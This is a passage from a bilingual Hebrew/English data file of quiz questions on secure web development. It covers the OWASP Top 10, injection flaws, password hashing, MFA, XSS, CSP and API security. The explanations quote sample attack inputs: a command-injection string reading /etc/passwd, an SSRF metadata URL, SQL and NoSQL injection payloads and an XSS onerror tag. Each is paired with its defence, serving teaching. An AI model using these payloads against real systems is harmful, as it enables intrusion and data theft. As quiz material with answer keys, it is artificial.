        "List of all tools used\nwith commands",
        "Full exploit code\nfor every vulnerability found",
        "Just a pie chart\nwith vulnerability percentages"
      ]
    }
  ],

  // ===== SECURE DEV (701-708) =====

  701: [
    {
      q: "\u200Fמהו הסיכון מספר 1 ברשימת OWASP Top 10 (2021)?",
      correct: "\u200FBroken Access Control — כשמשתמשים מבצעים פעולות מחוץ להרשאותיהם",
      choices: [
        "\u200FBroken Access Control — כשמשתמשים מבצעים פעולות מחוץ להרשאותיהם",
        "\u200FSQL Injection — הזרקת פקודות SQL",
        "\u200FCryptographic Failures — הצפנה חלשה",
        "\u200FCross-Site Scripting — הזרקת JavaScript"
      ],
      explanation: "‏Broken Access Control עלה למקום 1 בגרסת 2021.\n\nעיקרי:\n- הוא כולל IDOR, privilege escalation, ו-missing function level access control\n- ההגנה: בדיקת הרשאות בצד שרת בכל endpoint",
      explanationEn: "Broken Access Control rose to #1 in the 2021 edition.\n\nMain Points:\n- It includes IDOR, privilege escalation, and missing function level access control\n- Defense: server-side authorization checks on every endpoint",
      qEn: "What is the #1 risk in the OWASP Top 10 (2021)?",
      correctEn: "Broken Access Control — when users perform actions outside their permissions",
      choicesEn: [
        "Broken Access Control — when users perform actions outside their permissions",
        "SQL Injection — injecting SQL commands",
        "Cryptographic Failures — weak encryption",
        "Cross-Site Scripting — injecting JavaScript"
      ]
    },
    {
      q: "\u200Fמהו IDOR ואיך הוא קשור ל־Broken Access Control?",
      correct: "\u200Fשינוי מזהה (ID) ב־URL כדי לגשת למשאב של משתמש אחר, כי השרת לא מוודא בעלות",
      choices: [
        "\u200Fשינוי מזהה (ID) ב־URL כדי לגשת למשאב של משתמש אחר, כי השרת לא מוודא בעלות",
        "\u200Fהזרקת קוד JavaScript לדף של משתמש אחר",
        "\u200Fשימוש בסיסמה חלשה כדי לפרוץ לחשבון",
        "\u200Fמתקפת DDoS שגורמת לשרת לקרוס"
      ],
      explanation: "‏IDOR (Insecure Direct Object Reference) קורה כשתוקף משנה /api/users/123 ל-/api/users/456 וניגש לנתונים של משתמש אחר.\n\nעיקרי:\n- ההגנה: בדיקת בעלות בצד שרת",
      explanationEn: "IDOR (Insecure Direct Object Reference) happens when an attacker changes /api/users/123 to /api/users/456 and accesses another user's data.\n\nMain Points:\n- Defense: server-side ownership checks",
      qEn: "What is IDOR and how does it relate to Broken Access Control?",
      correctEn: "Changing an ID in the URL to access another user's resource because the server doesn't verify ownership",
      choicesEn: [
        "Changing an ID in the URL to access another user's resource because the server doesn't verify ownership",
        "Injecting JavaScript code into another user's page",
        "Using a weak password to break into an account",
        "A DDoS attack that crashes the server"
      ]
    },
    {
      q: "\u200Fמהי SSRF (A10) ואיך תוקף מנצל אותה?",
      correct: "\u200Fהתוקף גורם לשרת לבצע בקשות HTTP למשאבים פנימיים שאינם נגישים מבחוץ",
      choices: [
        "\u200Fהתוקף גורם לשרת לבצע בקשות HTTP למשאבים פנימיים שאינם נגישים מבחוץ",
        "\u200Fהתוקף שולח בקשות רבות כדי להפיל את השרת",
        "\u200Fהתוקף מזריק SQL דרך טופס חיפוש",
        "\u200Fהתוקף מחליף cookie של משתמש אחר"
      ],
      explanation: "‏ב־SSRF התוקף שולח URL כמו http://169.254.169.254/meta-data/ דרך ה־API, והשרת מבצע את הבקשה מתוך הרשת הפנימית.\n\nעיקרי:\n- הגנה: allowlist של דומיינים, חסימת כתובות פנימיות",
      explanationEn: "In SSRF the attacker sends a URL like http://169.254.169.254/meta-data/ via the API, and the server makes the request from within the internal network.\n\nMain Points:\n- Defense: domain allowlist, block internal IPs",
      qEn: "What is SSRF (A10) and how does an attacker exploit it?",
      correctEn: "The attacker causes the server to make HTTP requests to internal resources not accessible from outside",
      choicesEn: [
        "The attacker causes the server to make HTTP requests to internal resources not accessible from outside",
        "The attacker sends many requests to crash the server",
        "The attacker injects SQL through a search form",
        "The attacker replaces another user's cookie"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין A04 (Insecure Design) לבין באגים רגילים בקוד?",
      correct: "\u200FInsecure Design הן בעיות תכנון ארכיטקטורי שלא ניתן לתקן עם patching — רק שינוי עיצוב",
      choices: [
        "\u200FInsecure Design הן בעיות תכנון ארכיטקטורי שלא ניתן לתקן עם patching — רק שינוי עיצוב",
        "\u200Fאין הבדל — כל באג אבטחה הוא Insecure Design",
        "\u200FInsecure Design מתייחס רק לעיצוב גרפי של הממשק",
        "\u200FInsecure Design קורה רק בשפות תכנות ישנות"
      ],
      explanation: "‏A04 הוסף ב־2021 כקטגוריה נפרדת כי בעיות עיצוב שונות מבעיות מימוש.\n\nעיקרי:\n- דוגמה: מערכת שאלות אבטחה שניתן לנחש — גם קוד מושלם לא יתקן תכנון לקוי\n- הפתרון: threat modeling",
      explanationEn: "A04 was added in 2021 as a separate category because design flaws differ from implementation bugs.\n\nMain Points:\n- Example: security questions that can be guessed — even perfect code won't fix a flawed design\n- Solution: threat modeling",
      qEn: "What is the difference between A04 (Insecure Design) and regular code bugs?",
      correctEn: "Insecure Design are architectural planning issues that can't be fixed with patching — only design changes",
      choicesEn: [
        "Insecure Design are architectural planning issues that can't be fixed with patching — only design changes",
        "No difference — every security bug is Insecure Design",
        "Insecure Design refers only to UI/graphic design",
        "Insecure Design only occurs in old programming languages"
      ]
    },
    {
      q: "\u200Fמה החשיבות של A09 (Security Logging and Monitoring Failures)?",
      correct: "\u200Fללא לוגים תקינים, לא ניתן לזהות מתקפות — זמן זיהוי ממוצע עולה ל־200+ ימים",
      choices: [
        "\u200Fללא לוגים תקינים, לא ניתן לזהות מתקפות — זמן זיהוי ממוצע עולה ל־200+ ימים",
        "\u200Fלוגים חשובים רק לביצועים, לא לאבטחה",
        "\u200Fלוגים נדרשים רק כדי לעמוד בדרישות חוקיות",
        "\u200Fלוגים חוסמים מתקפות באופן אוטומטי"
      ],
      explanation: "‏A09 לא מונע מתקפות ישירות, אבל בלי logging תקין אי אפשר לזהות פריצה, לחקור אותה, או לשפר הגנות.\n\nעיקרי:\n- חובה לתעד: כניסות כושלות, שינויי הרשאות, גישה לנתונים רגישים",
      explanationEn: "A09 doesn't directly prevent attacks, but without proper logging you can't detect a breach, investigate it, or improve defenses.\n\nMain Points:\n- Must log: failed logins, permission changes, sensitive data access",
      qEn: "What is the importance of A09 (Security Logging and Monitoring Failures)?",
      correctEn: "Without proper logs, attacks can't be detected — average detection time exceeds 200+ days",
      choicesEn: [
        "Without proper logs, attacks can't be detected — average detection time exceeds 200+ days",
        "Logs are important only for performance, not security",
        "Logs are required only for legal compliance",
        "Logs automatically block attacks"
      ]
    }
  ],
  702: [
    {
      q: "\u200Fמהם שלושת סוגי ה־SQL Injection העיקריים?",
      correct: "\u200FIn-band (Classic), Blind SQLi (Boolean/Time-based), ו־Out-of-band",
      choices: [
        "\u200FIn-band (Classic), Blind SQLi (Boolean/Time-based), ו־Out-of-band",
        "\u200FGET injection, POST injection, ו־Cookie injection",
        "\u200FClient-side, Server-side, ו־Database-side",
        "\u200FSelect injection, Insert injection, ו־Delete injection"
      ],
      explanation: "‏In-band — תוצאות מוחזרות ישירות.\n\nעיקרי:\n- Blind — התוקף מסיק מידע מתגובות כן/לא או זמני תגובה\n- Out-of-band — תוצאות נשלחות לשרת חיצוני של התוקף",
      explanationEn: "In-band — results returned directly.\n\nMain Points:\n- Blind — attacker infers information from yes/no responses or response times\n- Out-of-band — results sent to attacker's external server",
      qEn: "What are the three main types of SQL Injection?",
      correctEn: "In-band (Classic), Blind SQLi (Boolean/Time-based), and Out-of-band",
      choicesEn: [
        "In-band (Classic), Blind SQLi (Boolean/Time-based), and Out-of-band",
        "GET injection, POST injection, and Cookie injection",
        "Client-side, Server-side, and Database-side",
        "Select injection, Insert injection, and Delete injection"
      ]
    },
    {
      q: "\u200Fמהו Parameterized Query ולמה הוא מונע SQL Injection?",
      correct: "\u200Fמפריד בין קוד SQL לנתונים — הנתונים לעולם לא מתפרשים כפקודות",
      choices: [
        "\u200Fמפריד בין קוד SQL לנתונים — הנתונים לעולם לא מתפרשים כפקודות",
        "\u200Fמצפין את כל השאילתות לפני שליחה ל־DB",
        "\u200Fחוסם תווים מסוכנים כמו גרש ומקף",
        "\u200Fמגביל את אורך הקלט ל־100 תווים"
      ],
      explanation: "‏Parameterized Queries (Prepared Statements) שולחים את הנתונים בנפרד מהשאילתה.\n\nעיקרי:\n- ה־DB יודע שהנתונים הם נתונים ולא פקודות, אז ' OR 1=1 -- מתפרש כטקסט רגיל",
      explanationEn: "Parameterized Queries (Prepared Statements) send data separately from the query.\n\nMain Points:\n- The DB knows the data is data, not commands, so ' OR 1=1 -- is treated as plain text",
      qEn: "What is a Parameterized Query and why does it prevent SQL Injection?",
      correctEn: "Separates SQL code from data — data is never interpreted as commands",
      choicesEn: [
        "Separates SQL code from data — data is never interpreted as commands",
        "Encrypts all queries before sending to DB",
        "Blocks dangerous characters like quotes and dashes",
        "Limits input length to 100 characters"
      ]
    },
    {
      q: "\u200Fלמה execFile בטוח יותר מ-exec ב־Node.js למניעת Command Injection?",
      correct: "\u200Fexec מעביר מחרוזת ל-shell ומאפשר שרשור פקודות. execFile מפריד פקודה מארגומנטים ולא עובר דרך shell",
      choices: [
        "\u200Fexec מעביר מחרוזת ל-shell ומאפשר שרשור פקודות. execFile מפריד פקודה מארגומנטים ולא עובר דרך shell",
        "\u200FexecFile מהיר יותר ולכן חוסם מתקפות",
        "\u200FexecFile מצפין את הפלט אוטומטית",
        "\u200Fאין הבדל אבטחתי — שניהם בטוחים באותה מידה"
      ],
      explanation: "‏exec('ping ' + userInput) עם input כמו 'google.com; cat /etc/passwd' יריץ שתי פקודות.\n\nעיקרי:\n- execFile('ping', ['-c','1', host]) מתייחס לכל ארגומנט כטקסט ולא כפקודה",
      explanationEn: "exec('ping ' + userInput) with input like 'google.com; cat /etc/passwd' runs two commands.\n\nMain Points:\n- execFile('ping', ['-c','1', host]) treats each argument as text, not a command",
      qEn: "Why is execFile safer than exec in Node.js for preventing Command Injection?",
      correctEn: "exec passes a string to the shell allowing command chaining. execFile separates command from arguments and doesn't go through the shell",
      choicesEn: [
        "exec passes a string to the shell allowing command chaining. execFile separates command from arguments and doesn't go through the shell",
        "execFile is faster and therefore blocks attacks",
        "execFile encrypts output automatically",
        "No security difference — both are equally safe"
      ]
    },
    {
      q: "\u200Fאיך עובדת מתקפת NoSQL Injection על MongoDB?",
      correct: "\u200Fהתוקף שולח אובייקט JSON עם אופרטורים כמו $ne במקום מחרוזת, ומשנה את לוגיקת השאילתה",
      choices: [
        "\u200Fהתוקף שולח אובייקט JSON עם אופרטורים כמו $ne במקום מחרוזת, ומשנה את לוגיקת השאילתה",
        "\u200Fהתוקף מזריק פקודות SQL רגילות דרך MongoDB",
        "\u200Fהתוקף מוחק את כל ה-collections דרך ממשק האדמין",
        "\u200FNoSQL לא פגיע להזרקות כלל"
      ],
      explanation: "‏במקום לשלוח password: 'abc', התוקף שולח password: {$ne: ''} — שזה אומר 'password שונה מריק' = תמיד true.\n\nעיקרי:\n- הגנה: בדיקת typeof על כל קלט",
      explanationEn: "Instead of sending password: 'abc', the attacker sends password: {$ne: ''} — meaning 'password not equal to empty' = always true.\n\nMain Points:\n- Defense: typeof checking on all input",
      qEn: "How does a NoSQL Injection attack on MongoDB work?",
      correctEn: "The attacker sends a JSON object with operators like $ne instead of a string, changing the query logic",
      choicesEn: [
        "The attacker sends a JSON object with operators like $ne instead of a string, changing the query logic",
        "The attacker injects regular SQL commands through MongoDB",
        "The attacker deletes all collections through the admin interface",
        "NoSQL is not vulnerable to injections at all"
      ]
    },
    {
      q: "\u200Fמהו Time-based Blind SQL Injection?",
      correct: "\u200Fהתוקף משתמש ב־SLEEP() ומסיק אם תנאי נכון לפי זמן התגובה של השרת",
      choices: [
        "\u200Fהתוקף משתמש ב־SLEEP() ומסיק אם תנאי נכון לפי זמן התגובה של השרת",
        "\u200Fמתקפה שמתבצעת רק בזמנים מסוימים ביום",
        "\u200Fמתקפה שלוקחת הרבה זמן להשלמה ולכן נקראת 'time-based'",
        "\u200Fמתקפה שמשנה את השעה בשרת ה־DB"
      ],
      explanation: "‏התוקף שולח: ' AND IF(1=1, SLEEP(5), 0) -- .\n\nעיקרי:\n- אם התשובה מתעכבת 5 שניות, הביטוי נכון\n- כך ניתן לחלץ מידע bit-by-bit\n- כלי כמו sqlmap מאפשר אוטומציה מלאה",
      explanationEn: "The attacker sends: ' AND IF(1=1, SLEEP(5), 0) --.\n\nMain Points:\n- If the response is delayed 5 seconds, the expression is true\n- This allows extracting information bit-by-bit\n- Tools like sqlmap automate this",
      qEn: "What is Time-based Blind SQL Injection?",
      correctEn: "The attacker uses SLEEP() and infers whether a condition is true based on the server's response time",
      choicesEn: [
        "The attacker uses SLEEP() and infers whether a condition is true based on the server's response time",
        "An attack that only occurs at certain times of day",
        "An attack that takes a long time to complete hence called 'time-based'",
        "An attack that changes the time on the DB server"
      ]
    }
  ],
  703: [
    {
      q: "\u200Fלמה bcrypt עדיף על SHA-256 לאחסון סיסמאות?",
      correct: "\u200Fbcrypt איטי בכוונה (cost factor מתכוונן) — GPU יכול לחשב מיליארדי SHA-256 בשנייה אבל רק אלפי bcrypt",
      choices: [
        "\u200Fbcrypt איטי בכוונה (cost factor מתכוונן) — GPU יכול לחשב מיליארדי SHA-256 בשנייה אבל רק אלפי bcrypt",
        "\u200Fbcrypt מייצר hash קצר יותר שתופס פחות מקום ב־DB",
        "\u200FSHA-256 הוא אלגוריתם ישן שכבר נפרץ",
        "\u200Fbcrypt לא צריך salt בניגוד ל־SHA-256"
      ],
      explanation: "‏bcrypt מתוכנן להיות איטי — cost factor קובע כמה סיבובי חישוב.\n\nעיקרי:\n- ככל שחומרה מתחזקת, מגדילים את ה-cost\n- SHA-256 מהיר מדי ופגיע ל-brute force\n- bcrypt גם כולל salt מובנה",
      explanationEn: "bcrypt is designed to be slow — cost factor determines computation rounds.\n\nMain Points:\n- As hardware improves, increase the cost\n- SHA-256 is too fast and vulnerable to brute force\n- bcrypt also includes built-in salt",
      qEn: "Why is bcrypt preferred over SHA-256 for storing passwords?",
      correctEn: "bcrypt is intentionally slow (adjustable cost factor) — GPUs can compute billions of SHA-256/sec but only thousands of bcrypt",
      choicesEn: [
        "bcrypt is intentionally slow (adjustable cost factor) — GPUs can compute billions of SHA-256/sec but only thousands of bcrypt",
        "bcrypt generates a shorter hash that takes less DB space",
        "SHA-256 is an old algorithm that has been cracked",
        "bcrypt doesn't need salt unlike SHA-256"
      ]
    },
    {
      q: "\u200Fמהם שלושת גורמי הזיהוי ב־MFA?",
      correct: "\u200Fמשהו שאתה יודע (סיסמה), משהו שיש לך (טלפון/מפתח), משהו שאתה (ביומטרי)",
      choices: [
        "\u200Fמשהו שאתה יודע (סיסמה), משהו שיש לך (טלפון/מפתח), משהו שאתה (ביומטרי)",
        "\u200Fסיסמה, מייל, ושם משתמש",
        "\u200Fסיסמה ראשית, סיסמה משנית, וקוד PIN",
        "\u200Fזיהוי פנים, טביעת אצבע, וזיהוי קול"
      ],
      explanation: "‏MFA דורש לפחות שני גורמים שונים: Something you know (סיסמה), Something you have (טלפון, YubiKey), Something you are (טביעת אצבע).\n\nעיקרי:\n- שני סוגי סיסמאות = עדיין גורם אחד",
      explanationEn: "MFA requires at least two different factors: Something you know (password), Something you have (phone, YubiKey), Something you are (fingerprint).\n\nMain Points:\n- Two passwords = still one factor",
      qEn: "What are the three authentication factors in MFA?",
      correctEn: "Something you know (password), something you have (phone/key), something you are (biometric)",
      choicesEn: [
        "Something you know (password), something you have (phone/key), something you are (biometric)",
        "Password, email, and username",
        "Primary password, secondary password, and PIN code",
        "Face recognition, fingerprint, and voice recognition"
      ]
    },
    {
      q: "\u200Fלמה SMS OTP נחשב לשיטת MFA חלשה?",
      correct: "\u200Fפגיע ל־SIM Swapping — תוקף משכנע את חברת הסלולר להעביר את המספר לסים שלו",
      choices: [
        "\u200Fפגיע ל־SIM Swapping — תוקף משכנע את חברת הסלולר להעביר את המספר לסים שלו",
        "\u200Fכי קודי SMS תמיד מכילים רק 4 ספרות",
        "\u200Fכי SMS לא מוצפן ולכן התוקף יכול לפרוץ לשרת ה־SMS",
        "\u200Fכי SMS דורש חיבור אינטרנט שלא תמיד זמין"
      ],
      explanation: "‏SIM Swapping היא מתקפת הנדסה חברתית.\n\nעיקרי:\n- התוקף מתקשר לחברת הסלולר ומעביר את מספר הקורבן לסים חדש\n- כל ה־OTP מגיעים לתוקף\n- TOTP ו־FIDO2 לא תלויים בחברת סלולר",
      explanationEn: "SIM Swapping is a social engineering attack.\n\nMain Points:\n- The attacker calls the carrier and transfers the victim's number to a new SIM\n- All OTPs go to the attacker\n- TOTP and FIDO2 don't depend on carriers",
      qEn: "Why is SMS OTP considered a weak MFA method?",
      correctEn: "Vulnerable to SIM Swapping — attacker convinces the carrier to transfer the number to their SIM",
      choicesEn: [
        "Vulnerable to SIM Swapping — attacker convinces the carrier to transfer the number to their SIM",
        "Because SMS codes always contain only 4 digits",
        "Because SMS is not encrypted so the attacker can hack the SMS server",
        "Because SMS requires internet which is not always available"
      ]
    },
    {
      q: "\u200Fמהם ה-cookie flags החשובים לאבטחת sessions?",
      correct: "\u200FHttpOnly (אין גישת JS), Secure (HTTPS בלבד), SameSite (הגנת CSRF)",
      choices: [
        "\u200FHttpOnly (אין גישת JS), Secure (HTTPS בלבד), SameSite (הגנת CSRF)",
        "\u200FPublic, Private, ו־Protected",
        "\u200FReadable, Writable, ו־Executable",
        "\u200FPersistent, Session, ו־Temporary"
      ],
      explanation: "‏HttpOnly מונע גישה ל-cookie מ־JavaScript (מגן מ־XSS).\n\nעיקרי:\n- Secure שולח cookie רק דרך HTTPS\n- SameSite מגביל שליחת cookie מדומיינים חיצוניים (מגן מ־CSRF)",
      explanationEn: "HttpOnly prevents JavaScript access to cookie (protects from XSS).\n\nMain Points:\n- Secure sends cookie only over HTTPS\n- SameSite restricts cookie sending from external domains (protects from CSRF)",
      qEn: "What are the important cookie flags for session security?",
      correctEn: "HttpOnly (no JS access), Secure (HTTPS only), SameSite (CSRF protection)",
      choicesEn: [
        "HttpOnly (no JS access), Secure (HTTPS only), SameSite (CSRF protection)",
        "Public, Private, and Protected",
        "Readable, Writable, and Executable",
        "Persistent, Session, and Temporary"
      ]
    },
    {
      q: "\u200Fלמה חשוב להחזיר הודעת שגיאה גנרית בעמוד login?",
      correct: "\u200Fהודעה ספציפית כמו 'User not found' מאפשרת user enumeration — גילוי אילו חשבונות קיימים",
      choices: [
        "\u200Fהודעה ספציפית כמו 'User not found' מאפשרת user enumeration — גילוי אילו חשבונות קיימים",
        "\u200Fכי הודעות גנריות מהירות יותר לרנדור",
        "\u200Fכי זה דרישה חוקית בלבד, בלי ערך אבטחתי",
        "\u200Fכדי לחסוך בעלויות תרגום לשפות שונות"
      ],
      explanation: "‏הודעה כמו 'User not found' מגלה שהמייל לא רשום.\n\nעיקרי:\n- עם הודעה 'Invalid email or password' התוקף לא יודע אם המייל קיים, מה שמקשה על credential stuffing ו-brute force ממוקד",
      explanationEn: "A message like 'User not found' reveals the email isn't registered.\n\nMain Points:\n- With 'Invalid email or password' the attacker doesn't know if the email exists, making targeted credential stuffing and brute force harder",
      qEn: "Why is it important to return a generic error message on a login page?",
      correctEn: "A specific message like 'User not found' enables user enumeration — discovering which accounts exist",
      choicesEn: [
        "A specific message like 'User not found' enables user enumeration — discovering which accounts exist",
        "Because generic messages are faster to render",
        "Because it's a legal requirement only, with no security value",
        "To save on translation costs for different languages"
      ]
    }
  ],
  704: [
    {
      q: "\u200Fמהם שלושת סוגי XSS העיקריים?",
      correct: "\u200FReflected (מה־URL), Stored (נשמר ב־DB), DOM-based (מבוצע בצד הלקוח)",
      choices: [
        "\u200FReflected (מה־URL), Stored (נשמר ב־DB), DOM-based (מבוצע בצד הלקוח)",
        "\u200FClient XSS, Server XSS, ו־Network XSS",
        "\u200FSimple XSS, Advanced XSS, ו־Expert XSS",
        "\u200FGET XSS, POST XSS, ו־Cookie XSS"
      ],
      explanation: "‏Reflected — הקוד מגיע מה־URL ומוחזר בתשובה.\n\nעיקרי:\n- Stored — הקוד נשמר ב־DB ופוגע בכל מי שגולש\n- DOM-based — הקוד מבוצע בדפדפן ישירות ללא מעורבות השרת",
      explanationEn: "Reflected — code comes from URL and is returned in response.\n\nMain Points:\n- Stored — code is saved in DB and affects everyone who browses\n- DOM-based — code executes in browser directly without server involvement",
      qEn: "What are the three main types of XSS?",
      correctEn: "Reflected (from URL), Stored (saved in DB), DOM-based (executed client-side)",
      choicesEn: [
        "Reflected (from URL), Stored (saved in DB), DOM-based (executed client-side)",
        "Client XSS, Server XSS, and Network XSS",
        "Simple XSS, Advanced XSS, and Expert XSS",
        "GET XSS, POST XSS, and Cookie XSS"
      ]
    },
    {
      q: "\u200Fלמה Stored XSS מסוכן יותר מ־Reflected XSS?",
      correct: "\u200Fנשמר ב־DB ופוגע בכל משתמש שגולש בדף, ללא צורך בקישור מיוחד",
      choices: [
        "\u200Fנשמר ב־DB ופוגע בכל משתמש שגולש בדף, ללא צורך בקישור מיוחד",
        "\u200Fכי הוא עובד רק בדפדפנים ישנים ולכן קשה לזיהוי",
        "\u200Fכי הוא מצפין את הנתונים ב־DB",
        "\u200Fאין הבדל — שניהם באותה רמת סיכון"
      ],
      explanation: "‏Reflected דורש שהקורבן ילחץ על קישור מיוחד.\n\nעיקרי:\n- Stored מאוחסן ב־DB ומופעל אוטומטית בכל גלישה בדף — פוגע בהרבה יותר משתמשים וקשה יותר לזיהוי כי הקוד לא נראה ב־URL",
      explanationEn: "Reflected requires the victim to click a special link.\n\nMain Points:\n- Stored is saved in DB and activates automatically on every page view — affects more users and is harder to detect since the code isn't visible in the URL",
      qEn: "Why is Stored XSS more dangerous than Reflected XSS?",
      correctEn: "Saved in DB and affects every user who browses the page, no special link needed",
      choicesEn: [
        "Saved in DB and affects every user who browses the page, no special link needed",
        "Because it only works in old browsers making it harder to detect",
        "Because it encrypts DB data",
        "No difference — both are equally risky"
      ]
    },
    {
      q: "\u200Fמהו CSP (Content Security Policy) ואיך הוא מגן מ־XSS?",
      correct: "\u200FHTTP header שמגדיר מאילו מקורות הדפדפן רשאי לטעון סקריפטים ומשאבים",
      choices: [
        "\u200FHTTP header שמגדיר מאילו מקורות הדפדפן רשאי לטעון סקריפטים ומשאבים",
        "\u200Fפרוטוקול הצפנה שמחליף HTTPS",
        "\u200Fתוסף דפדפן שחוסם פרסומות ו־XSS",
        "\u200Fכלי סריקה שמוצא XSS בקוד מקור"
      ],
      explanation: "‏CSP מגביל מאיפה אפשר לטעון JS, CSS, תמונות וכו'.\n\nעיקרי:\n- script-src 'self' אומר רק סקריפטים מהדומיין שלנו\n- גם אם תוקף מזריק script — הדפדפן חוסם אותו כי הוא לא ממקור מורשה",
      explanationEn: "CSP restricts where JS, CSS, images etc.\n\nMain Points:\n- can be loaded from\n- script-src 'self' means only scripts from our domain\n- Even if an attacker injects script — the browser blocks it as it's not from an allowed source",
      qEn: "What is CSP (Content Security Policy) and how does it protect against XSS?",
      correctEn: "An HTTP header that defines which sources the browser may load scripts and resources from",
      choicesEn: [
        "An HTTP header that defines which sources the browser may load scripts and resources from",
        "An encryption protocol replacing HTTPS",
        "A browser extension that blocks ads and XSS",
        "A scanning tool that finds XSS in source code"
      ]
    },
    {
      q: "\u200Fלמה innerHTML מסוכן ומה האלטרנטיבה הבטוחה?",
      correct: "\u200FinnerHTML מפרש קלט כ־HTML ומאפשר הרצת קוד — האלטרנטיבה: textContent שמציג טקסט רגיל",
      choices: [
        "\u200FinnerHTML מפרש קלט כ־HTML ומאפשר הרצת קוד — האלטרנטיבה: textContent שמציג טקסט רגיל",
        "\u200FinnerHTML איטי מדי — האלטרנטיבה: document.write",
        "\u200FinnerHTML עובד רק ב־IE — האלטרנטיבה: outerHTML",
        "\u200FinnerHTML לא תומך ב־Unicode — האלטרנטיבה: innerText"
      ],
      explanation: "‏innerHTML מכניס HTML שמבוצע — כולל <img onerror=alert(1)>.\n\nעיקרי:\n- textContent מתייחס לכל דבר כטקסט רגיל\n- ב־React, המקביל המסוכן הוא dangerouslySetInnerHTML",
      explanationEn: "innerHTML inserts HTML that gets executed — including <img onerror=alert(1)>.\n\nMain Points:\n- textContent treats everything as plain text\n- In React, the dangerous equivalent is dangerouslySetInnerHTML",
      qEn: "Why is innerHTML dangerous and what is the safe alternative?",
      correctEn: "innerHTML interprets input as HTML allowing code execution — alternative: textContent which displays plain text",
      choicesEn: [
        "innerHTML interprets input as HTML allowing code execution — alternative: textContent which displays plain text",
        "innerHTML is too slow — alternative: document.write",
        "innerHTML only works in IE — alternative: outerHTML",
        "innerHTML doesn't support Unicode — alternative: innerText"
      ]
    },
    {
      q: "\u200Fהאם React מגן לחלוטין מפני XSS?",
      correct: "\u200Fלא — dangerouslySetInnerHTML, href עם javascript: protocol, ו־SSR יכולים ליצור פגיעויות",
      choices: [
        "\u200Fלא — dangerouslySetInnerHTML, href עם javascript: protocol, ו־SSR יכולים ליצור פגיעויות",
        "\u200Fכן — React חוסם כל סוגי XSS באופן מלא",
        "\u200Fלא — React בכלל לא מטפל ב־XSS, צריך ספריות חיצוניות",
        "\u200Fכן — רק אם משתמשים בגרסה האחרונה"
      ],
      explanation: "‏React מבצע encoding אוטומטי ב־JSX expressions (סוגריים מסולסלים)\n\nעיקרי:\n- אבל חריגים\n- dangerouslySetInnerHTML מזריק HTML ישירות\n- href='javascript:...' מאפשר הרצת קוד",
      explanationEn: "React performs automatic encoding in JSX expressions (curly braces), but exceptions: dangerouslySetInnerHTML injects HTML directly, href='javascript:...' allows code execution, and SSR with unfiltered data..\n\nMain Points:\n- React performs automatic encoding in JSX expressions (curly ",
      qEn: "Does React fully protect against XSS?",
      correctEn: "No — dangerouslySetInnerHTML, href with javascript: protocol, and SSR can create vulnerabilities",
      choicesEn: [
        "No — dangerouslySetInnerHTML, href with javascript: protocol, and SSR can create vulnerabilities",
        "Yes — React blocks all types of XSS completely",
        "No — React doesn't handle XSS at all, external libraries are needed",
        "Yes — only when using the latest version"
      ]
    }
  ],
  705: [
    {
      q: "\u200Fמהו BOLA ולמה הוא הסיכון מספר 1 ב־OWASP API Security?",
      correct: "\u200Fגישה לאובייקטים של משתמשים אחרים דרך שינוי ID בבקשת API, בגלל חוסר בדיקת בעלות",
      choices: [
        "\u200Fגישה לאובייקטים של משתמשים אחרים דרך שינוי ID בבקשת API, בגלל חוסר בדיקת בעלות",
        "\u200Fמתקפת DDoS על API endpoints",
        "\u200Fשימוש ב־API ללא אימות כלל",
        "\u200Fחשיפת תיעוד API לציבור"
      ],
      explanation: "‏BOLA (Broken Object Level Authorization) — תוקף משנה GET /api/orders/123 ל-/api/orders/456 ורואה הזמנה של משתמש אחר.\n\nעיקרי:\n- ההגנה: בדיקת userId בכל שאילתה",
      explanationEn: "BOLA (Broken Object Level Authorization) — attacker changes GET /api/orders/123 to /api/orders/456 and sees another user's order.\n\nMain Points:\n- Defense: check userId in every query",
      qEn: "What is BOLA and why is it the #1 risk in OWASP API Security?",
      correctEn: "Accessing other users' objects by changing the ID in API requests due to missing ownership checks",
      choicesEn: [
        "Accessing other users' objects by changing the ID in API requests due to missing ownership checks",
        "DDoS attack on API endpoints",
        "Using an API without any authentication",
        "Exposing API documentation to the public"
      ]
    },
    {
      q: "\u200Fמה היתרון של Token Bucket על פני Fixed Window ל-rate limiting?",
      correct: "\u200FFixed Window מאפשר burst כפול בגבול חלונות. Token Bucket מאפשר burst מבוקר תוך שמירה על קצב ממוצע",
      choices: [
        "\u200FFixed Window מאפשר burst כפול בגבול חלונות. Token Bucket מאפשר burst מבוקר תוך שמירה על קצב ממוצע",
        "\u200FToken Bucket חוסם יותר בקשות ולכן בטוח יותר",
        "\u200FFixed Window עובד רק עם IP, Token Bucket עובד עם user ID",
        "\u200Fאין הבדל — שניהם עובדים אותו דבר"
      ],
      explanation: "‏Fixed Window של 100/דקה: 100 בקשות בשנייה 59 + 100 בשנייה 0 של החלון הבא = 200 בקשות ב־2 שניות.\n\nעיקרי:\n- Token Bucket מוסיף tokens בקצב קבוע ומאפשר burst רק כשיש tokens",
      explanationEn: "Fixed Window of 100/min: 100 requests at second 59 + 100 at second 0 of next window = 200 requests in 2 seconds.\n\nMain Points:\n- Token Bucket adds tokens at a constant rate and allows bursts only when tokens are available",
      qEn: "What is the advantage of Token Bucket over Fixed Window for rate limiting?",
      correctEn: "Fixed Window allows double burst at window boundaries. Token Bucket allows controlled burst while maintaining average rate",
      choicesEn: [
        "Fixed Window allows double burst at window boundaries. Token Bucket allows controlled burst while maintaining average rate",
        "Token Bucket blocks more requests so it's safer",
        "Fixed Window only works with IP, Token Bucket works with user ID",
        "No difference — both work the same way"
      ]
    },
    {
      q: "\u200Fלמה אחסון JWT ב-localStorage מסוכן?",
      correct: "\u200FlocalStorage נגיש לכל JavaScript בדף — מתקפת XSS יכולה לגנוב את ה-token",
      choices: [
        "\u200FlocalStorage נגיש לכל JavaScript בדף — מתקפת XSS יכולה לגנוב את ה-token",
        "\u200FlocalStorage מוגבל ל־5MB ו־JWT גדול מדי",
        "\u200FlocalStorage נמחק כשסוגרים את הדפדפן",
        "\u200FlocalStorage לא עובד ב-mobile browsers"
      ],
      explanation: "‏כל JavaScript בדף יכול לקרוא localStorage.\n\nעיקרי:\n- אם יש XSS, התוקף קורא את ה־JWT ושולח אותו לשרת שלו\n- האלטרנטיבה: HttpOnly cookie שלא נגיש ל־JS, עם הגנת SameSite מ־CSRF",
